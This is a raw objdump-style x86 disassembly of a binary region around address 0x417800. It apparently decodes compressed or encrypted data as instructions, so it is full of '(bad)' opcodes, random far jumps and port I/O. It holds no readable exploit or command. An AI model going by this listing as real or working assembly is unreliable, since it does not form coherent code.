  41777c:	neg    BYTE PTR [ecx-0x338bb066]
  417782:	lods   al,BYTE PTR ds:[esi]
  417783:	xchg   BYTE PTR [ebx+esi*4-0x47],dl
  417787:	pop    ebp
  417788:	pusha  
  417789:	cs mov ebx,ebp
  41778c:	sub    BYTE PTR [ecx],dh
  41778e:	ins    BYTE PTR es:[edi],dx
  41778f:	mov    es,WORD PTR [eax]
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	shl    BYTE PTR [ebp+0x7414167c],cl
  417805:	clc    
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	sbb    DWORD PTR [esi-0x64],esp
  41780f:	adc    al,0x95
  417811:	mov    al,0x1b
  417813:	mov    edi,0x1e49a19b
  417818:	or     edi,edx
  41781a:	add    dh,0x9e
  41781d:	in     al,0xb5
  41781f:	inc    esi
  417820:	mov    BYTE PTR [ebp-0x78],al
  417823:	jecxz  0x4178a1
  417825:	fiadd  DWORD PTR [edx+0x249208fb]
  41782b:	dec    edi
  41782c:	stos   DWORD PTR es:[edi],eax
  41782d:	fwait
  41782e:	sbb    al,0x28
  417830:	stos   DWORD PTR es:[edi],eax
  417831:	cmp    dl,BYTE PTR [ecx+0x16fbb9f0]
  417837:	fadd   st,st(6)
  417839:	xor    esp,esp
  41783b:	pop    ebx
  41783c:	mov    dl,0xa5
  41783e:	inc    esp
  41783f:	push   0xd59bbf04
  417844:	jp     0x4177e7
  417846:	push   esp
  417847:	mov    eax,0x9bab14c9
  41784c:	cmp    cl,ah
  41784e:	(bad)  
  41784f:	loop   0x4178a4
  417851:	scas   al,BYTE PTR es:[edi]
  417852:	add    DWORD PTR [edx+ebx*4],ebp
  417855:	or     ah,dh
  417857:	xchg   ebp,eax
  417858:	push   0x7868fe7e
  41785d:	inc    esp
  41785e:	cmp    ch,BYTE PTR [eax+eax*8]
  417861:	out    0x69,al
  417863:	ds dec esp
  417865:	cmp    al,0x20
  417867:	xor    eax,0xe866eaf6
  41786c:	enter  0xee68,0x1e
  417870:	cmp    BYTE PTR [ebp-0x1ae3eb16],ch
  417876:	data16 aad 0x83
  417879:	adc    al,0xce
  41787b:	push   0x6f
  41787d:	jl     0x41781a
  41787f:	aaa    
  417880:	dec    esi
  417881:	xchg   esi,eax
  417882:	sbb    BYTE PTR [ebp-0x5e],ah
  417885:	and    DWORD PTR [eax],esi
  417887:	and    BYTE PTR [edi+edi*2+0x67c5a43e],0xa8
  41788f:	mov    dl,0x75
  417891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417892:	cmp    al,0x17
  417894:	ins    BYTE PTR es:[edi],dx
  417895:	shl    BYTE PTR [edi+0x2be92de4],cl
  41789b:	out    dx,al
  41789c:	daa    
  41789d:	rcl    DWORD PTR [ecx+0x7e6fdf40],cl
  4178a3:	es jg  0x417873
  4178a6:	sbb    bl,bh
  4178a8:	nop
  4178a9:	fbstp  TBYTE PTR [ebx+0x4d7a16ca]
  4178af:	inc    eax
  4178b0:	ins    BYTE PTR es:[edi],dx
  4178b1:	sub    DWORD PTR [edi],ecx
  4178b3:	icebp  
  4178b4:	cmp    bl,dh
  4178b6:	add    eax,0x827598e
  4178bb:	call   DWORD PTR [eax+esi*2-0x75ca3150]
  4178c2:	sahf   
  4178c3:	xor    edx,ecx
  4178c5:	ror    BYTE PTR [edx-0x60],cl
  4178c8:	repnz adc ah,dl
  4178cb:	cmp    al,0x8f
  4178cd:	push   0xffffffb3
  4178cf:	mov    dl,0x34
  4178d1:	mov    al,ds:0x561ef276
  4178d6:	jmp    0x951f:0xe60cf0c1
  4178dd:	test   BYTE PTR [eax],0xca
  4178e0:	lods   eax,DWORD PTR ds:[esi]
  4178e1:	popa   
  4178e2:	cli    
  4178e3:	loopne 0x417891
  4178e5:	mov    ds:0x479804bd,eax
  4178ea:	mov    edi,0xa01fed01
  4178ef:	ret    0xab5b
  4178f2:	clc    
  4178f3:	add    BYTE PTR gs:[esi],0xf7
  4178f7:	sahf   
  4178f8:	jle    0x41789a
  4178fa:	scas   eax,DWORD PTR es:[edi]
  4178fb:	or     BYTE PTR [eax-0x16],bh
  4178fe:	mov    al,ds:0xd21e1ca1
  417903:	into   
  417904:	sbb    ebp,esi
  417906:	mov    esi,esi
  417908:	sahf   
  417909:	jl     0x41789f
  41790b:	stos   DWORD PTR es:[edi],eax
  41790c:	push   es
  41790d:	cmp    al,0x7d
  41790f:	push   es
	...
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	inc    edx
  417981:	fwait
  417982:	mov    esp,ss
  417984:	js     0x41797f
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	xor    al,al
  41798e:	xchg   ebx,eax
  41798f:	popa   
  417990:	dec    edx
  417991:	mov    ebp,DWORD PTR [ebx*2+0x6986aa1d]
  417998:	out    dx,al
  417999:	ret    0x5f9d
  41799c:	bound  ebp,QWORD PTR [ecx+0x5bea37dc]
  4179a2:	push   cs
  4179a3:	in     eax,dx
  4179a4:	xor    esp,ebx
  4179a6:	mov    dh,0xa3
  4179a8:	aad    0x49
  4179aa:	mov    ecx,0xe4ce8d9
  4179af:	jno    0x41795d
  4179b1:	in     al,0xcc
  4179b3:	pxor   mm1,QWORD PTR [ebp+0x3cc46936]
  4179ba:	push   DWORD PTR [edi+0x11]
  4179bd:	mov    al,0xac
  4179bf:	cwde   
  4179c0:	adc    BYTE PTR [eax+0x34],cl
  4179c3:	in     eax,0x77
  4179c5:	and    BYTE PTR [edi-0x67],bl
  4179c8:	aam    0x3c
  4179ca:	mov    al,ds:0x651e9098
  4179cf:	jecxz  0x417a36
  4179d1:	ja     0x417a32
  4179d3:	cmp    DWORD PTR [edx+0x529f4136],0x67
  4179da:	push   ds
  4179db:	xchg   edi,eax
  4179dc:	mov    eax,ds:0x3bbe70a4
  4179e1:	and    bl,BYTE PTR [eax+0x34]
  4179e4:	mov    dh,0x69
  4179e6:	sti    
  4179e7:	lods   eax,DWORD PTR ds:[esi]
  4179e8:	lock xchg ecx,eax
  4179ea:	inc    esp
  4179eb:	cmp    bh,BYTE PTR [esi]
  4179ed:	and    DWORD PTR [esi+0x49e9abc7],ecx
  4179f3:	xchg   esi,eax
  4179f4:	lea    edx,[ebx+0x51]
  4179f7:	xchg   edx,eax
  4179f8:	add    BYTE PTR [edi+0x4cc35a5c],dh
  4179fe:	dec    esp
  4179ff:	xchg   bl,bl
  417a01:	pop    ds
  417a02:	aam    0x49
  417a04:	xchg   edi,eax
  417a05:	push   0x3c
  417a07:	rol    DWORD PTR [ecx+edx*8],1
  417a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a0b:	pop    esi
  417a0c:	pop    esi
  417a0d:	jns    0x4179ce
  417a0f:	repz jns 0x417a1f
  417a12:	add    edi,eax
  417a14:	outs   dx,BYTE PTR ds:[esi]
  417a15:	pop    ss
  417a16:	cli    
  417a17:	or     DWORD PTR [ebx+0x66b20b9b],edx
  417a1d:	push   ds
  417a1e:	cmp    BYTE PTR [eax-0x42],ah
  417a21:	jmp    0x86a84a45
  417a26:	leave  
  417a27:	fistp  DWORD PTR [ebp*2-0x613c83a2]
  417a2e:	je     0x417a78
  417a30:	or     BYTE PTR [ecx],bh
  417a32:	nop
  417a33:	mov    ds:0xadac84d1,eax
  417a38:	or     bh,0x2a
  417a3b:	cmp    eax,0xb83a4be
  417a40:	sar    DWORD PTR [eax+0x45],0x1b
  417a44:	(bad)  
  417a45:	mov    ds:0x94583c52,eax
  417a4a:	xchg   edx,eax
  417a4b:	adc    al,al
  417a4d:	es test al,0x7f
  417a50:	or     BYTE PTR [ecx],0x18
  417a53:	mov    WORD PTR [ebx+0x45],gs
  417a56:	fdiv   QWORD PTR fs:[eax-0xdd18f33]
  417a5d:	sub    al,0xb7
  417a5f:	nop
  417a60:	mov    bh,0xe0
  417a62:	jmp    0x417a9a
  417a64:	pop    esi
  417a65:	or     al,0x50
  417a67:	cs push ss
  417a69:	mov    bl,0xd
  417a6b:	outs   dx,BYTE PTR ds:[esi]
  417a6c:	out    0x8c,al
  417a6e:	stos   DWORD PTR es:[edi],eax
  417a6f:	gs cmp al,0xfe
  417a72:	dec    ebx
  417a73:	jp     0x417a96
  417a75:	jecxz  0x417a63
  417a77:	inc    esp
  417a78:	add    eax,0x5780c6c0
  417a7d:	add    BYTE PTR [edx+0x71],dl
  417a80:	jae    0x417a33
  417a82:	adc    ch,BYTE PTR [edi+0x3ab8d6b2]
  417a88:	mov    ds:0x23151fa0,al
  417a8d:	ds mov al,0xe0
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x2aecf1b4]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	sbb    eax,0x4fde4795
  417b11:	into   
  417b12:	outs   dx,DWORD PTR ds:[esi]
  417b13:	repnz mov ds:0x4f50bc30,eax
  417b19:	sbb    ecx,DWORD PTR [ebx]
  417b1b:	(bad)  
  417b1c:	push   esi
  417b1d:	adc    eax,0x6bcb22a5
  417b22:	mov    ebp,0x3a740261
  417b27:	popf   
  417b28:	xchg   esp,eax
  417b29:	ja     0x417b39
  417b2b:	setle  BYTE PTR [ebx-0x10eecf1b]
  417b32:	call   0xbed4:0x1b57bcdb
  417b39:	jns    0x417b6e
  417b3b:	sub    ah,0xb1
  417b3e:	jbe    0x417b38
  417b40:	add    al,0x5c
  417b42:	mov    ecx,0x824b9438
  417b47:	fmul   QWORD PTR ds:0x4e56f13b
  417b4d:	outs   dx,BYTE PTR ds:[esi]
  417b4e:	pop    ebp
  417b4f:	ja     0x417afd
  417b51:	sbb    al,0x5a
  417b53:	add    ecx,ebx
  417b55:	(bad)  
  417b56:	mov    ah,0x96
  417b58:	int3   
  417b59:	cmp    DWORD PTR [edx-0x55],edi
  417b5c:	aaa    
  417b5d:	pop    esi
  417b5e:	fnsave [eax-0x34]
  417b61:	daa    
  417b62:	mov    cl,0xfc
  417b64:	cli    
  417b65:	call   0xac8f:0xa7715d11
  417b6c:	or     DWORD PTR [esi-0x3119065a],eax
  417b72:	or     al,0x25
  417b74:	mov    dh,0xa1
  417b76:	pop    ebp
  417b77:	mov    eax,0x69123f85
  417b7c:	stos   BYTE PTR es:[edi],al
  417b7d:	sub    eax,0x1cc997af
  417b82:	rol    BYTE PTR [esi],0x9f
  417b85:	dec    ecx
  417b86:	inc    ebp
  417b87:	jg     0x417b63
  417b89:	adc    cl,BYTE PTR [ecx-0x7f]
  417b8c:	push   edx
  417b8d:	out    dx,eax
  417b8e:	fnsave [edx+0x74]
  417b91:	out    dx,eax
  417b92:	stos   BYTE PTR es:[edi],al
  417b93:	push   esp
  417b94:	cmp    esp,edx
  417b96:	cmc    
  417b97:	mov    bh,0xfd
  417b99:	jbe    0x417bc4
  417b9b:	popa   
  417b9c:	push   ss
  417b9d:	rcl    edx,0xea
  417ba0:	pop    es
  417ba1:	(bad)  
  417ba3:	cmc    
  417ba4:	loope  0x417b86
  417ba6:	sbb    BYTE PTR [edi],al
  417ba8:	sub    ebp,eax
  417baa:	mov    gs,WORD PTR [edx+0x324b3c31]
  417bb0:	ss xchg edi,eax
  417bb2:	or     eax,0x2c038c1
  417bb7:	push   esi
  417bb8:	retf   
  417bb9:	in     eax,dx
  417bba:	jmp    0x2bf7:0x9e63da2c
  417bc1:	inc    ebx
  417bc2:	mov    ah,0xfb
  417bc4:	lahf   
  417bc5:	retf   0x8471
  417bc8:	pop    edi
  417bc9:	cwde   
  417bca:	sbb    al,0x93
  417bcc:	sbb    BYTE PTR [ecx+ebx*2+0x3c],al
  417bd0:	dec    esp
  417bd1:	lea    edx,[ecx+0x1a]
  417bd4:	sub    eax,0x96e76032
  417bd9:	fcmove st,st(1)
  417bdb:	enter  0xc6f4,0x59
  417bdf:	and    edx,DWORD PTR [ecx]
  417be1:	nop
  417be2:	shl    BYTE PTR [edi+ebx*2],0x10
  417be6:	mov    cl,0xec
  417be8:	arpl   WORD PTR [ebx],sp
  417bea:	sub    edi,DWORD PTR [ebx-0x50ef472a]
  417bf0:	shl    bl,cl
  417bf2:	(bad)  
  417bf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf4:	jle    0x417bc7
  417bf6:	mov    dl,0xd8
  417bf8:	adc    al,0x31
  417bfa:	repnz sub cl,ah
  417bfd:	lock dec ebx
  417bff:	(bad)  
  417c01:	push   0x3d394ae5
  417c06:	dec    ecx
  417c07:	adc    esp,esp
  417c09:	call   0x67ba:0xf3f96444
	...
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x40
  417c81:	dec    ebx
  417c82:	dec    ebp
  417c83:	push   eax
  417c84:	cmp    bl,0x0
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	mov    al,ds:0xa4d74e38
  417c91:	std    
  417c92:	push   edi
  417c93:	mov    edx,0xa427f09e
  417c98:	push   ecx
  417c99:	lahf   
  417c9a:	sub    ecx,ebp
  417c9c:	dec    esp
  417c9d:	push   esi
  417c9e:	add    BYTE PTR [ebx],bh
  417ca0:	in     eax,0xd3
  417ca2:	fsub   QWORD PTR [ebp-0x55939dcb]
  417ca8:	inc    ecx
  417ca9:	push   ss
  417caa:	fs dec ecx
  417cac:	fcom   QWORD PTR [ebx]
  417cae:	and    BYTE PTR [eax],0x83
  417cb1:	fbld   TBYTE PTR [ebx+0x4a3670ac]
  417cb7:	add    eax,0x247df1d0
  417cbc:	mov    ds:0xc1d45cb8,eax
  417cc1:	(bad)  
  417cc2:	xchg   edx,eax
  417cc3:	xlat   BYTE PTR ds:[ebx]
  417cc4:	out    0x4c,al
  417cc6:	sub    BYTE PTR [esi],0x2b
  417cc9:	cmp    eax,0x5ae39db0
  417cce:	sbb    DWORD PTR [esi+0x7a],edi
  417cd1:	pushf  
  417cd2:	cmp    dh,BYTE PTR [edi]
  417cd4:	mov    ds:0x34f8ebf5,eax
  417cd9:	pop    edx
  417cda:	jmp    0x417d0a
  417cdc:	out    0xca,eax
  417cde:	imul   esp,DWORD PTR [eax-0x12],0xb9cb8638
  417ce5:	push   ecx
  417ce6:	jae    0x417c79
  417ce8:	inc    eax
  417ce9:	out    dx,eax
  417cea:	nop
  417ceb:	mov    fs,WORD PTR [ebx]
  417ced:	inc    ebx
  417cee:	mov    ds:0x5fa7cdfd,eax
  417cf3:	icebp  
  417cf4:	mov    bh,0x89
  417cf6:	or     BYTE PTR [edi-0x63aeb055],cl
  417cfc:	(bad)  
  417cfd:	imul   ebp,DWORD PTR [edx-0x35],0xe08bed66
  417d04:	push   ecx
  417d05:	and    BYTE PTR [esi+0x71],bl
  417d08:	loopne 0x417d85
  417d0a:	jp     0x417cf4
  417d0c:	cmp    eax,0x1bd725de
  417d11:	push   esi
  417d12:	push   esp
  417d13:	dec    edx
  417d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d15:	inc    edx
  417d16:	add    eax,0x59beb5c8
  417d1b:	scas   al,BYTE PTR es:[edi]
  417d1c:	jge    0x417ce1
  417d1e:	cwde   
  417d1f:	aam    0xbe
  417d21:	xchg   ebp,eax
  417d22:	jecxz  0x417d5d
  417d24:	in     eax,0x2e
  417d26:	push   cs
  417d27:	es add al,0x9e
  417d2a:	inc    edx
  417d2b:	cld    
  417d2c:	rol    BYTE PTR [eax],0x8b
  417d2f:	lahf   
  417d30:	add    ecx,DWORD PTR ds:0xdf08cb4d
  417d36:	inc    eax
  417d37:	std    
  417d38:	push   edx
  417d39:	mov    DWORD PTR [edi-0x2c],edi
  417d3c:	adc    bl,ch
  417d3e:	push   edx
  417d3f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417d41:	push   edi
  417d42:	xchg   ebx,eax
  417d43:	push   es
  417d44:	jmp    0x2e0470b9
  417d49:	or     ecx,DWORD PTR [ebx+0x8]
  417d4c:	cs std 
  417d4e:	xchg   edi,eax
  417d4f:	push   cs
  417d50:	xlat   BYTE PTR ds:[ebx]
  417d51:	sub    BYTE PTR [eax+0x3e4a439c],ch
  417d57:	or     edi,esp
  417d59:	mov    esp,0xf4ad661a
  417d5e:	jne    0x417db9
  417d60:	aad    0xd0
  417d62:	and    bl,bh
  417d64:	lock outs dx,BYTE PTR ds:[esi]
  417d66:	dec    edi
  417d67:	clc    
  417d68:	cli    
  417d69:	xor    dh,bl
  417d6b:	mov    al,ds:0x96f034c5
  417d70:	and    eax,0x26afd562
  417d75:	dec    ebx
  417d76:	jbe    0x417da8
  417d78:	mov    al,BYTE PTR [esi+0x61]
  417d7b:	in     eax,dx
  417d7c:	hlt    
  417d7d:	lahf   
  417d7e:	xchg   edx,eax
  417d7f:	mov    ds:0xe714213a,al
  417d84:	xchg   edx,eax
  417d85:	les    ebx,FWORD PTR [edx+esi*4]
  417d88:	das    
  417d89:	sub    bh,BYTE PTR [ebx+0x1494dad4]
  417d8f:	stos   BYTE PTR es:[edi],al
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	pop    edi
  417e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e02:	cld    
  417e03:	stos   DWORD PTR es:[edi],eax
  417e04:	test   ah,bh
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	les    ebx,FWORD PTR [edx-0x52474cb7]
  417e12:	rol    BYTE PTR [eax-0x3a82b3de],cl
  417e18:	sbb    ch,BYTE PTR [ebx+edx*1]
  417e1b:	lea    esp,[edx+0x5a24f1dd]
  417e21:	jbe    0x417e19
  417e23:	mov    edx,es
  417e25:	sub    BYTE PTR [esi],ah
  417e27:	push   es
  417e28:	push   ecx
  417e29:	or     eax,0xf732bf73
  417e2e:	lahf   
  417e2f:	sbb    BYTE PTR [esi-0x5d61f46d],bh
  417e35:	ret    0xea68
  417e38:	mov    eax,ds:0xdac91b54
  417e3d:	adc    DWORD PTR [eax],0x4c
  417e40:	aam    0x93
  417e42:	or     BYTE PTR [ecx+0xb],0x19
  417e46:	fcomp  QWORD PTR [ecx+0xd18ad97]
  417e4c:	inc    eax
  417e4d:	xchg   BYTE PTR [eax],cl
  417e4f:	jp     0x417e15
  417e51:	ret    
  417e52:	retf   
  417e53:	cmp    DWORD PTR [esi-0x78860b89],esi
  417e59:	push   ebx
  417e5a:	ja     0x417e2f
  417e5c:	shr    bl,0x5e
  417e5f:	adc    BYTE PTR [edx-0x4d],dh
  417e62:	dec    edx
  417e63:	xchg   ecx,eax
  417e64:	add    BYTE PTR [ecx-0x595ceccc],0x5c
  417e6b:	mov    esp,0x66de4d75
  417e70:	push   ecx
  417e71:	lods   eax,DWORD PTR ds:[esi]
  417e72:	pop    ds
  417e73:	and    BYTE PTR [edi-0x56],ah
  417e76:	push   0x2910fbae
  417e7b:	cmp    eax,0x149a2841
  417e80:	push   ecx
  417e81:	mov    ds:0xf76fcb30,al
  417e86:	loope  0x417e14
  417e88:	je     0x417eb4
  417e8a:	xor    bh,BYTE PTR [ebp-0x69]
  417e8d:	pop    esi
  417e8e:	xchg   DWORD PTR [edi-0x3b4d4e3],eax
  417e94:	adc    BYTE PTR [edx],ah
  417e96:	xchg   esi,eax
  417e97:	in     al,0x6
  417e99:	inc    esi
  417e9a:	dec    BYTE PTR [esi]
  417e9c:	imul   edi,DWORD PTR [edx-0x514ddc87],0x4a7da5f0
  417ea6:	stc    
  417ea7:	push   ecx
  417ea8:	mov    esi,0xe5d64143
  417ead:	push   edx
  417eae:	add    esi,DWORD PTR [edx+0x21]
  417eb1:	retf   
  417eb2:	jp     0x417ec5
  417eb4:	push   ecx
  417eb5:	xlat   BYTE PTR ds:[ebx]
  417eb6:	lds    edi,FWORD PTR [edx+eiz*8]
  417eb9:	fadd   QWORD PTR [ebx]
  417ebb:	lea    eax,[esi+0xe]
  417ebe:	adc    ah,al
  417ec0:	fs dec ecx
  417ec2:	repnz inc ecx
  417ec4:	stos   DWORD PTR es:[edi],eax
  417ec5:	dec    ecx
  417ec6:	outs   dx,BYTE PTR ds:[esi]
  417ec7:	push   ds
  417ec8:	arpl   WORD PTR [ebx],bx
  417eca:	das    
  417ecb:	adc    ebx,DWORD PTR [eax-0x18]
  417ece:	fwait
  417ecf:	stos   BYTE PTR es:[edi],al
  417ed0:	xor    DWORD PTR ds:0xc1e16108,ebx
  417ed6:	jmp    0x475a:0xa5cd1a73
  417edd:	and    DWORD PTR [edx*2+0x3582d5c1],ecx
  417ee4:	fistp  QWORD PTR ds:0x1cd0d8f0
  417eea:	pop    eax
  417eeb:	and    DWORD PTR [ebx],edi
  417eed:	fwait
  417eee:	ret    0xcd3a
  417ef1:	sbb    esi,ecx
  417ef3:	popa   
  417ef4:	mov    cs,WORD PTR [esi-0x66]
  417ef7:	into   
  417ef8:	jge    0x417eb6
  417efa:	scas   eax,DWORD PTR es:[edi]
  417efb:	pop    eax
  417efc:	pop    eax
  417efd:	ficom  DWORD PTR [edx+0x3776a3af]
  417f03:	(bad)  
  417f04:	aam    0xad
  417f06:	(bad)  
  417f07:	mov    bh,0x11
  417f09:	(bad)  
  417f0a:	pop    edx
  417f0b:	in     al,0x81
  417f0d:	mov    dl,0x99
  417f0f:	xor    BYTE PTR [eax],al
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	fsubp  st(4),st
  417f82:	adc    eax,0xfd8883
  417f87:	add    BYTE PTR [ecx+eax*1],al
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	clc    
  417f8d:	jg     0x417f11
  417f8f:	pop    ebp
  417f90:	pop    esi
  417f91:	imul   edi,DWORD PTR [ebx+0x361081d4],0xffffffe5
  417f98:	fwait
  417f99:	cwde   
  417f9a:	ror    bh,0x31
  417f9d:	lock jge 0x417f41
  417fa0:	in     al,0xa2
  417fa2:	aas    
  417fa3:	mov    dh,0x81
  417fa5:	push   ebx
  417fa6:	imul   edi,DWORD PTR [ecx-0x582d14c9],0xffffffb3
  417fad:	xchg   BYTE PTR [edi+0x62],dl
  417fb0:	out    dx,eax
  417fb1:	imul   eax,DWORD PTR ss:[eax-0x336eb42f],0xffffffa1
  417fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fba:	stos   BYTE PTR es:[edi],al
  417fbb:	ss jl  0x41800f
  417fbe:	xchg   edi,eax
  417fbf:	sub    DWORD PTR [ecx-0x24066b2f],eax
  417fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fc6:	(bad)  
  417fc7:	xchg   ebx,eax
  417fc8:	inc    eax
  417fc9:	push   cs
  417fca:	xchg   ebx,eax
  417fcb:	push   cs
  417fcc:	iret   
  417fcd:	mov    al,bl
  417fcf:	aam    0xe1
  417fd1:	retf   0x3d58
  417fd4:	pop    es
  417fd5:	push   0xc187b8fb
  417fda:	out    dx,eax
  417fdb:	ret    0x74ef
  417fde:	xor    bl,BYTE PTR [esp+ebp*8]
  417fe1:	cwde   
  417fe2:	repz mov al,ds:0x3933b248
  417fe8:	pop    ebp
  417fe9:	xchg   esi,eax
  417fea:	sbb    bh,ch
  417fec:	and    cl,BYTE PTR [ecx+0x41]
  417fef:	mov    ebx,DWORD PTR [eax+0x5f]
  417ff2:	push   ecx
  417ff3:	ror    al,cl
  417ff5:	or     al,BYTE PTR [ebx]
  417ff7:	sbb    DWORD PTR [edi],ebp
  417ff9:	jno    0x417fd4
  417ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ffc:	aaa    
  417ffd:	jmp    DWORD PTR [ebp+0x4e]
  418000:	dec    eax
  418001:	xrelease mov DWORD PTR [esi-0x2d],edi
  418005:	or     eax,0x71f4941e
  41800a:	les    ebp,FWORD PTR [esi-0x75]
  41800d:	push   0x2d
  41800f:	icebp  
  418010:	inc    esp
  418011:	imul   ebx,DWORD PTR [ecx-0x1c],0x2c5d0fa9
  418018:	mov    esp,0x92e7f75c
  41801d:	mov    ch,0x5f
  41801f:	xchg   esi,eax
  418020:	jnp    0x417fe9
  418022:	push   ds
  418023:	aad    0xd0
  418025:	sub    eax,0xe9542ff3
  41802a:	js     0x418001
  41802c:	mov    ds,WORD PTR [edi+0x529e9ade]
  418032:	(bad)  
  418033:	sbb    edi,DWORD PTR ds:0xd5177782
  418039:	inc    ebx
  41803a:	jecxz  0x417fff
  41803c:	imul   esp,eax,0x5b779b91
  418042:	mov    ecx,0xca7cb32d
  418047:	push   esi
  418048:	pop    edx
  418049:	pop    ds
  41804a:	out    dx,eax
  41804b:	ss xchg ebp,eax
  41804d:	or     DWORD PTR [edi+0x51],ebx
  418050:	cwde   
  418051:	sbb    al,0x5d
  418053:	mov    ah,0x9a
  418055:	inc    ecx
  418056:	sub    BYTE PTR [ebx],bh
  418058:	jmp    0x16b0dbfa
  41805d:	sbb    al,0xcf
  41805f:	mov    ebp,0x84907ec5
  418064:	lock adc eax,0xb50e9dcc
  41806a:	mov    ecx,0x1b9c891
  41806f:	iret   
  418070:	mov    edx,0x4afbdfc6
  418075:	iret   
  418076:	ret    0xa4bb
  418079:	lock scas eax,DWORD PTR es:[edi]
  41807b:	pop    ebx
  41807c:	mov    ds:0x39a3c535,eax
  418081:	dec    ebp
  418082:	test   eax,0x5b1a5590
  418087:	int    0x29
  418089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41808a:	pop    esp
  41808b:	add    BYTE PTR [ecx+0xbd22d8],al
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0xda2fdebc,eax
  418101:	ins    DWORD PTR es:[edi],dx
  418102:	stos   DWORD PTR es:[edi],eax
  418103:	or     BYTE PTR [esi+edi*8+0x1040000],0x0
  41810b:	add    BYTE PTR [edx+0x48],dh
  41810e:	mov    ah,0x3
  418110:	jns    0x41815b
  418112:	add    edi,DWORD PTR [ebp-0x2cfbd969]
  418118:	test   eax,0xb387efd5
  41811d:	add    al,0xf0
  41811f:	call   0x6b317d88
  418124:	test   BYTE PTR [esi-0x72386f0b],dl
  41812a:	pop    edx
  41812b:	rcr    DWORD PTR [ebx-0x36],1
  41812e:	cs test bh,0xfb
  418132:	int3   
  418133:	push   ds
  418134:	mov    ebp,0xa27652b8
  418139:	mov    bh,0xe4
  41813b:	int    0xbf
  41813d:	loop   0x418167
  41813f:	or     ecx,eax
  418141:	and    al,0x99
  418143:	aam    0x39
  418145:	mov    ds:0xc224a477,eax
  41814a:	xchg   esi,eax
  41814b:	jmp    0x4852:0x31cd0f5b
  418152:	lea    ecx,[esi]
  418154:	sub    al,0x71
  418156:	js     0x4180f7
  418158:	cmp    DWORD PTR [eax+0x4a],esp
  41815b:	ror    cl,1
  41815d:	cs mov edi,0x52d39b7d
  418163:	push   edi
  418164:	xchg   DWORD PTR [edx],esi
  418166:	inc    eax
  418167:	fnsave [esi+0x61fa13c4]
  41816d:	mov    eax,ds:0x331d822e
  418172:	mov    esp,0xe5606a15
  418177:	and    al,0x33
  418179:	adc    eax,0xf30a555d
  41817e:	inc    edx
  41817f:	mov    ds:0x83a724d3,al
  418184:	adc    BYTE PTR [edx+0x49ee3197],al
  41818a:	retf   
  41818b:	xor    eax,0xffbe8382
  418190:	popf   
  418191:	mov    DWORD PTR es:[edi+0xf],edx
  418195:	fisub  WORD PTR [edx+edx*4+0x362ca3e8]
  41819c:	sbb    al,ah
  41819e:	das    
  41819f:	data16 lahf 
  4181a1:	pop    es
  4181a2:	mov    edx,0x4780484f
  4181a7:	lock xchg edx,eax
  4181a9:	or     esi,DWORD PTR [ebx]
  4181ab:	hlt    
  4181ac:	dec    ebp
  4181ad:	inc    ebp
  4181ae:	mov    al,ds:0xee7bcb8a
  4181b3:	loop   0x418224
  4181b5:	(bad)  
  4181b6:	(bad)  
  4181b7:	hlt    
  4181b8:	or     dh,bl
  4181ba:	cwde   
  4181bb:	ret    0x3229
  4181be:	push   ebx
  4181bf:	push   0xe1fbdd0f
  4181c4:	xlat   BYTE PTR ds:[ebx]
  4181c5:	js     0x41814d
  4181c7:	and    DWORD PTR [eax],0xffffffbd
  4181ca:	sti    
  4181cb:	mov    eax,ds:0x6022040a
  4181d0:	sti    
  4181d1:	(bad)  
  4181d3:	and    BYTE PTR [edi],ch
  4181d5:	xchg   edx,eax
  4181d6:	int3   
  4181d7:	add    eax,0xfe6e908c
